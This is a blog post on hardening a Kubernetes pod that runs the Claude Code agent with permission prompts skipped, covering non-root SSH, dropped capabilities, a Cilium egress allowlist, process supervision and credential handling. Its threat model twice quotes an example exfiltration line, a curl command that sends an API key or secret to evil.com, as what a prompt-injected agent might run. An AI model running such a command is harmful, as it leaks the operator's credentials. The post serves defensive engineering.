---
title: "Secure Agent Pod — Hardening an AI Coding Workstation"
series: ["building"]
date: 2026-03-31
draft: false
tags: ["security", "agent", "claude", "cilium", "ssh", "gpu-1", "vibekanban", "non-root", "cron", "telegram", "monitoring"]
summary: "Rebuilding the Kali workstation as a hardened, non-root pod with layered defenses — because giving an AI agent skip-permissions demands more than trust."
weight: 22
---

In [Post 18]({{< relref "/docs/building/18-persistent-agent" >}}), we deployed a persistent Kali Linux container on gpu-1 as an always-on Claude Code workstation. It worked — SSH in from anywhere, persistent PVC, self-healing pod. But it ran as root, had unrestricted network access, and installed tools at runtime via a startup script.

That was fine for interactive use. But when you run a coding agent with `--dangerously-skip-permissions` — letting it execute arbitrary commands without confirmation — the risk profile changes completely. A prompt injection that tricks the agent into running `curl https://evil.com -d "$ANTHROPIC_API_KEY"` would succeed without any barrier.

This post covers rebuilding the workstation as a hardened pod with layered defenses: non-root execution, dropped capabilities, Cilium egress controls, and VibeKanban for agent orchestration.

## The Threat Model

`--dangerously-skip-permissions` bypasses the agent's built-in permission prompts, but it does **not** bypass:

- OS-level file permissions and user isolation
- Kubernetes SecurityContext constraints
- Cilium network policies (egress allowlist)
- Claude Code hooks (PreToolUse/PostToolUse fire regardless)
- Pod-level capability restrictions

We stack every layer that survives. The main threats:

| Threat | Impact | Defense |
|--------|--------|---------|
| Agent hallucinating dangerous commands | High | Claude Code hooks (user-deployed) |
| Prompt injection via fetched content | High | Cilium egress allowlist |
| Credential exfiltration via curl/wget | Critical | Cilium egress allowlist |
| Plugin supply chain compromise | Critical | Container isolation + egress control |
| Container escape | Critical | Talos hardened OS + non-root |

## Architecture: Two Containers, Shared PVC

The original Kali pod was a single root container with a ConfigMap startup script. The secure-agent-pod is now a **two-container pod** sharing a PVC, both built from a shared base lineage at [`derio-net/agent-images`](https://github.com/derio-net/agent-images):

```
gpu-1 (i9, 128GB RAM)
└── secure-agent-pod (replicas: 1, Recreate strategy)
    │
    ├── kali container — supervised by s6-overlay (PID 1 = /init)
    │     ├── sshd (port 2222, user-mode, key-only auth)
    │     └── supercronic (non-root cron replacement)
    │   image: ghcr.io/derio-net/secure-agent-kali
    │
    ├── vk-local sidecar — tini PID 1
    │     └── vibe-kanban (local mode, SQLite, port 8081)
    │   image: ghcr.io/derio-net/vk-local
    │
    ├── PVC: agent-home (50Gi, /home/claude — mounted in both containers)
    ├── Secret: agent-ssh-keys → /etc/ssh-keys/
    ├── Secret: agent-configs → ~/.kube/configs/ (optional)
    └── ServiceAccount: agent-sa (cluster-admin)
```

Everything runs as user `claude` (UID 1000). No root. No sudo. All capabilities dropped.

### Three-tier image lineage

The image lineage was flattened in the [`agents--restart-resilience`](https://github.com/derio-net/frank/blob/main/docs/superpowers/specs/2026-04-27--agents--restart-resilience-design.md) layer to share boot logic across a planned fleet of sibling agent pods:

```
agent-base                        # debian:bookworm-slim + kubectl/jq/git/curl/claude/gh
  ├── agent-shell-base            # + s6-overlay v3, sshd, supercronic, tmux+mosh,
  │     │                         #   tmux-resurrect, tmux-continuum, /etc/cont-init.d,
  │     │                         #   /etc/services.d, /etc/cont-finish.d
  │     └── secure-agent-kali     # + Kali repo + pentest tools + /opt/scripts + crontab
  │                               #   --build-arg AGENT_USER=claude AGENT_HOME=/home/claude
  │                               #   (overrides the parameterized default `agent`/`/home/agent`
  │                               #    to keep the existing PV-resident state — see "the rename
  │                               #    plan" for the future flip)
  └── vk-local                    # tini PID 1 + vibe-kanban (no shell, no s6, no sshd)
```

`agent-shell-base` is the share-point: every future shell-driven agent pod (gemini, gpt, hermes, media-generation, …) will inherit from it and get s6-overlay, sshd, supercronic, the tmux persistence stack, and the cont-init.d / services.d / cont-finish.d skeleton for free. The default user/home are `agent`/`/home/agent`; secure-agent-kali keeps `claude`/`/home/claude` via build-arg parameterization to avoid a state-rewrite migration. New shell pods inherit the defaults and accrue no rename debt.

### Why VibeKanban?

[VibeKanban](https://github.com/BloopAI/vibe-kanban) is an agent orchestration tool that manages workspaces, spawns coding agents, and tracks tasks. It runs in local mode with SQLite — no external database needed.

The original design called for three sidecar containers (VibeKanban server + PostgreSQL + ElectricSQL) running the remote/self-hosted mode. Testing revealed that the remote server doesn't expose the local workspace to its sessions, making it useless for our use case. Local mode does exactly what we need: single process, file-based database, same filesystem as the agent.

## Building the Image

The image is built from `kalilinux/kali-rolling` with all tools baked in — no runtime installs. This is a key security improvement over the original Kali pod, which ran `apt-get install` on every startup.

The Dockerfile installs:

- **Claude Code CLI** + **VibeKanban** (via npm)
- **kubectl**, **talosctl**, **omnictl** (cluster management)
- **Node.js 22**, **Python 3**, **Bun** (development runtimes)
- **supercronic** (non-root cron replacement — Go binary)
- **openssh-server** (for SSH access)
- **tmux + mosh + locales-all** (persistent shells — added post-deploy; see [operating post]({{< relref "/docs/operating/14-secure-agent-pod" >}}#persistent-shells-with-mosh--tmux))
- Standard tools: git, curl, wget, jq, vim

What's **not** installed: sudo. If new tools are needed, rebuild the image and redeploy. Intentional friction.

The image also bundles the agent's operational scripts at `/opt/scripts/` — a security guardrails hook (PreToolUse/PostToolUse), session manager for Claude Code remote-control, exercise reminders, daily audit digest, Telegram notifications, and Pushgateway heartbeat. These are pod infrastructure, not application code, so they belong in the image rather than a separate repo. Config templates (crontab, `.bashrc`, Claude Code `settings.json`) are baked into `/opt/` and seeded to the PVC on first boot — user-modifiable from that point on.

### The PVC Mount Problem

The biggest gotcha in the build: **mounting a PVC at `/home/claude` hides everything the Dockerfile placed there**. The entrypoint, sshd config, crontab template — all invisible once Kubernetes mounts the persistent volume.

The solution: bake config files into `/opt/` and `/entrypoint.sh` (outside the mount path), then seed them onto the PVC on first boot:

```bash
# First-boot: create directories on PVC
mkdir -p "$HOME/.ssh-host-keys" "$HOME/.ssh" "$HOME/repos" "$HOME/.claude" "$HOME/.willikins-agent"
chmod 700 "$HOME/.ssh-host-keys" "$HOME/.ssh"

# First-boot: seed config files from /opt/ templates
[ -f "$HOME/.crontab" ]              || cp /opt/crontab "$HOME/.crontab"
[ -f "$HOME/.load-env.sh" ]          || cp /opt/load-env.sh "$HOME/.load-env.sh"
[ -f "$HOME/.bashrc" ]               || cp /opt/bashrc "$HOME/.bashrc"
[ -f "$HOME/.claude/settings.json" ] || cp /opt/settings.json "$HOME/.claude/settings.json"
```

Subsequent boots find the files already on the PVC and skip the copy.

## Running sshd Without Root

The original Kali pod ran as root, which made sshd trivial — it binds port 22, manages privilege separation, handles PAM sessions. The secure-agent-pod runs as UID 1000, which means:

- **Port 2222** instead of 22 (non-root can't bind privileged ports). The LoadBalancer Service maps external port 22 → internal 2222, so SSH clients don't notice.
- **User-mode sshd** with its own config file at `/opt/sshd_config`:

```
Port 2222
HostKey /home/claude/.ssh-host-keys/ssh_host_ed25519_key
HostKey /home/claude/.ssh-host-keys/ssh_host_rsa_key
AuthorizedKeysFile /home/claude/.ssh/authorized_keys
PubkeyAuthentication yes
PasswordAuthentication no
UsePAM no
StrictModes no
PidFile /home/claude/.ssh/sshd.pid
```

`UsePAM no` and `StrictModes no` are the key settings. Without PAM, sshd doesn't need root for session management. Without strict modes, it doesn't complain about file ownership (the PVC's `fsGroup` setting means files are owned by `root:claude` with group write, which strict mode would reject).

SSH host keys are generated on first boot and stored on the PVC, so they survive pod restarts — no more "host key changed" warnings.

## The Kubernetes Manifests

Seven files in `apps/secure-agent-pod/manifests/`:

| Manifest | Purpose |
|----------|---------|
| `serviceaccount.yaml` | Dedicated SA with cluster-admin (auditable identity) |
| `pvc-agent-home.yaml` | 50Gi Longhorn PVC for `/home/claude` |
| `deployment.yaml` | Two-container pod (`kali` + `vk-local` sidecar) sharing the `agent-home` PVC, Recreate strategy, gpu-1 affinity |
| `service-ssh.yaml` | LoadBalancer at `192.168.55.215:22` → 2222 |
| `service-vibekanban.yaml` | LoadBalancer at `192.168.55.218:8081` |
| `service-mosh.yaml` | LoadBalancer at `192.168.55.219` UDP/60000-60015 (added post-deploy for mosh) |
| `cilium-egress.yaml` | CiliumNetworkPolicy egress allowlist (disabled — see Gotchas) |
| `externalsecret.yaml` | ESO → Infisical (removed — Claude uses Max subscription auth) |

The SecurityContext is the core of the hardening:

```yaml
securityContext:
  runAsUser: 1000
  runAsGroup: 1000
  runAsNonRoot: true
  allowPrivilegeEscalation: false
  capabilities:
    drop: ["ALL"]
```

## Credential Injection

No credential touches disk as a plaintext file. The approach uses two tiers:

**Tier 1: ESO + Infisical** — for secrets managed by the cluster's secret store. Currently empty (Claude Code uses Max subscription login, not API keys), but the plumbing is ready for when other tools need injected credentials.

**Tier 2: Manual K8s Secrets** — for bootstrap secrets (SOPS-encrypted, applied out-of-band):
- `agent-ssh-keys` — SSH authorized_keys
- `agent-secrets-tier2` — manual credentials (Telegram, etc.)
- `agent-configs` — talosconfig, kubeconfig, omniconfig (mounted at `~/.kube/configs/`)

All secrets referenced by `envFrom` use `optional: true`, so the pod starts even if some secrets are missing.

### GitHub: a least-privilege App token, not a PAT

The pod's GitHub identity is a **GitHub App installation token**, not a personal
access token. A `GithubAccessToken` ExternalSecret generator mints a short-lived
(~1 h) token, written to a Secret mounted as a **live-updated file** at
`/var/run/github/token` that kubelet refreshes as the generator rotates it. The
App **private key never reaches the pod** — a filesystem compromise yields at most
a ~1 h token, not a reusable credential. The token carries scoped permissions
(contents / issues / pull-requests / workflows on selected repos), **not** the
org-owner powers the previous shared PAT held — the whole point of the move.

git reads it via the `~/.gitconfig` credential helper, and `gh` via a
`/usr/local/bin/gh` wrapper (App tokens rotate and have no user identity, so gh
needs the current token injected per call). The day-to-day commands and the sharp
edges — git helpers run under dash, always verify against a *private* repo,
per-repo/per-org install coverage — live in the
[operating post]({{< relref "/docs/operating/14-secure-agent-pod" >}}) and
`docs/runbooks/frank-gotchas/agent-shells.md`.

## Network Egress Control (Cilium)

The spec defines a CiliumNetworkPolicy with default-deny egress and an explicit allowlist:

- `api.anthropic.com` — Claude API
- `github.com`, `*.github.com`, `ghcr.io` — Git operations
- `registry.npmjs.org`, `pypi.org` — Package installs
- `api.telegram.org` — Agent notifications
- `192.168.55.0/24`, `192.168.50.0/24` — Cluster LAN
- `kube-apiserver` — kubectl from inside the pod

Everything else is blocked. A prompt injection running `curl https://evil.com -d "$SECRET"` fails at the Cilium datapath before leaving the node.

**Current status:** The Cilium FQDN egress policy is temporarily disabled due to a Cilium 1.17 bug ("FQDN regex compilation LRU not yet initialized"). This was the first FQDN-based CiliumNetworkPolicy in the cluster, and the Cilium agent on gpu-1 had never initialized the DNS proxy for FQDN resolution. The policy will be re-enabled after upgrading Cilium or finding a workaround. The other security layers remain active.

## Process Supervision

The original entrypoint was a three-line pattern:

```bash
/usr/sbin/sshd -f /opt/sshd_config -D &
supercronic "$HOME/.crontab" &
vibe-kanban &

echo "[agent] ready (sshd on :2222, supercronic, vibe-kanban on :8081)"
wait -n
```

`wait -n` exits when the first child dies, the container exits, K8s restarts it. Simple, but with a sharp edge: every child runs in the entrypoint's pgroup, so a stray signal to one child can propagate to the whole pgroup and take everything with it.

That bit on **2026-04-26 at 23:27**: the in-pod claude session manager SIGHUP'd supercronic, supercronic exited, `wait -n` returned, the container exited, mosh-server died with the container, the operator's tmux layout was gone. The image bumper re-rolled the pod 4.5h later for an unrelated reason and the same disruption replayed. Two real failures in a single day made the cost concrete.

The fix: replace `wait -n` with **s6-overlay v3** as PID 1 (in `agent-shell-base`, inherited by `secure-agent-kali`). Each long-running service gets its own supervisor process and signal namespace. A misbehaving child can't take down a sibling.

```
/init                              # s6-overlay, PID 1
  s6-svscan (supervisor manager)
    s6-supervise sshd
      /usr/sbin/sshd -f /opt/sshd_config -D
    s6-supervise supercronic
      supercronic /home/claude/.crontab
        … cron-spawned children (claude session-manager, vk-bridge.py, …)
```

Vibe-kanban is **not** under s6 in the kali container — it moved to its own `vk-local` sidecar (running tini as PID 1) so the kali container only has to supervise services that share the SSH/cron lineage. The sidecar has its own restart cycle, its own readinessProbe, and shares the `/home/claude` PVC for the SQLite database.

### Why s6-overlay (and not the alternatives)

- **Container-lifecycle stages** (`cont-init.d` / `services.d` / `cont-finish.d`) match exactly what we need: one-shot setup separated from supervised long-runners separated from teardown. The pre-stop tmux save lives cleanly in `cont-finish.d/02-tmux-save`, after `cont-finish.d/01-shutdown` runs the `bridge:shutdown` drain.
- **Crashloop bail policy** — 5 deaths within 60s → stop respawning that service, leave it down, keep other services running. Catches truly broken services (binary missing, config corrupt) without panicking on transient flaps. Telegram alerts on bail-out are out of scope for now; the K8s readinessProbe still catches sshd-down because the pod gets pulled from the LB.
- **Real PID-1 init** that handles zombie reaping and signal forwarding correctly. The bash + `wait -n` pattern works, but it's the kind of thing that subtly breaks when refactored.
- **Service dependencies (s6-rc)** become useful as soon as the second shell pod arrives — e.g., a credential-mount-ready barrier before a service starts.

The full architecture (cont-init.d ordering, tmux persistence, parameterized AGENT_USER/AGENT_HOME, the why-not-jinja-snippets analysis) lives in the [restart-resilience spec](https://github.com/derio-net/frank/blob/main/docs/superpowers/specs/2026-04-27--agents--restart-resilience-design.md).

### Bump alerts: ArgoCD Notifications → Telegram

When ArgoCD syncs the secure-agent-pod Application (image bump from the lockstep bumper, or a manual rollout), the deployment uses `Recreate` strategy: the old pod tears down before the new one starts, which costs ~30s of mosh + tmux session disruption. To make that disruption announced rather than surprising, the secure-agent-pod Application is annotated to subscribe to two ArgoCD Notifications triggers:

```yaml
metadata:
  annotations:
    notifications.argoproj.io/subscribe.on-sync-running.webhook: telegram
    notifications.argoproj.io/subscribe.on-sync-succeeded.webhook: telegram
```

The notifications controller (enabled in `apps/argocd/values.yaml`) fires a Telegram message via the webhook service when the sync starts (`🔄 …rolling out…`) and when it finishes (`✅ …synced`). The operator gets ~30s of heads-up before the mosh+tmux session needs to be re-spawned via WezTerm's Cmd+Shift+2 binding, which gives `cont-finish.d/02-tmux-save` time to write a final continuum snapshot before the container dies.

## Decommissioning the Old Kali Pod

The secure-agent-pod reuses the Kali workstation's SSH IP (`192.168.55.215`). The cutover:

1. Scale down old Kali deployment
2. Remove old manifests from `apps/kali/` and ArgoCD templates
3. Push — ArgoCD syncs, old service releases the IP, new service claims it
4. Delete old PVC and namespace manually (irreversible, confirmed with human)

## Verification

The full verification checklist:

| Check | Command | Result |
|-------|---------|--------|
| Non-root | `kubectl exec ... -- id` | `uid=1000(claude)` |
| No sudo | `kubectl exec ... -- which sudo` | Not found |
| Egress blocked | `curl https://httpbin.org/ip` | Skipped (Cilium bug) |
| Egress allowed | `curl https://api.anthropic.com/` | HTTP 404 (connects) |
| Secrets injected | `env \| grep ANTHROPIC` | Not set (Max sub auth) |
| VibeKanban | `pgrep -f vibe-kanban` | Running |
| PVC persistence | Delete pod, check files | Keys survive |
| VibeKanban UI | `http://192.168.55.218:8081` | HTTP 200 |
| SSH access | `ssh claude@192.168.55.215` | Login works |

```console
$ ssh -o StrictHostKeyChecking=no claude@192.168.55.215 'id && uname -srm && whoami && uptime'
uid=1000(claude) gid=1000(claude) groups=1000(claude),100(users)
Linux 6.18.18-talos x86_64
claude
 19:40:47 up 29 days,  1:58,  0 users,  load average: 1.40, 1.30, 1.25

```

## Gotchas

- **PVC mounts hide image contents.** Anything the Dockerfile places under the PVC mount path (`/home/claude`) becomes invisible. Put config templates in `/opt/` and seed them via the entrypoint.
- **`/run/secrets` conflicts with SA token mount.** Kubernetes mounts the ServiceAccount token at `/var/run/secrets/kubernetes.io/serviceaccount`, and `/run` → `/var/run` is a symlink. Don't mount anything at `/run/secrets`.
- **sshd needs `UsePAM no` for non-root.** Without this, sshd tries to create PAM sessions and fails silently.
- **VibeKanban needs `PORT` and `HOST` env vars.** Default is a random port on `127.0.0.1`. Set `PORT=8081` and `HOST=0.0.0.0` for fixed, externally-reachable binding.
- **VibeKanban downloads a binary at first run.** The npm package is just a wrapper — it fetches the real binary from `npm-cdn.vibekanban.com`. This must be allowed in egress policy.
- **Cilium 1.17 FQDN policies may fail.** The "LRU not yet initialized" error occurs when no endpoint on the node has previously triggered FQDN DNS proxy initialization. Stale BPF rules persist even after deleting the policy — restart the Cilium agent to clear them.
- **ESO rejects empty `data: []`.** If all keys are removed from an ExternalSecret, delete the manifest entirely rather than leaving an empty data array.
- **`command` vs `args` in PostgreSQL containers.** Using `command` overrides the entrypoint (`docker-entrypoint.sh`), skipping database initialization. Use `args` to pass flags while preserving the entrypoint. (Discovered during the original sidecar design, before simplifying to local mode.)

## What's Next

The pod is deployed and operational. The remaining work:

- **Re-enable Cilium egress policy** once the FQDN LRU bug is resolved (Cilium upgrade or workaround)
- **Agent scripts deployed** — Guardrails hook, session manager, exercise reminders, audit digest, and Telegram notifications are baked into the image at `/opt/scripts/`. Crontab and `.bashrc` templates seeded to PVC on first boot.
- **Health monitoring active** — Heartbeat metrics pushed to Prometheus Pushgateway, with Grafana alerts for stale heartbeats bridged to GitHub Issues via the health-bridge webhook.

The layered security model means each defense is independent. Even without Cilium egress (the biggest gap right now), the pod runs non-root with all capabilities dropped, no sudo, key-only SSH, and auditable ServiceAccount identity. Adding each layer back is additive hardening, not a single point of failure.

## References

- [Claude Code CLI — Skip Permissions](https://docs.anthropic.com/en/docs/claude-code/security)
- [Claude Code Hooks](https://docs.anthropic.com/en/docs/claude-code/hooks)
- [VibeKanban](https://github.com/BloopAI/vibe-kanban)
- [Cilium FQDN-based Policies](https://docs.cilium.io/en/stable/security/policy/language/#dns-based)
- [OpenSSH — Running as Non-Root](https://man.openbsd.org/sshd_config)
- [supercronic — Cron for Containers](https://github.com/aptible/supercronic)
- [Kubernetes Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
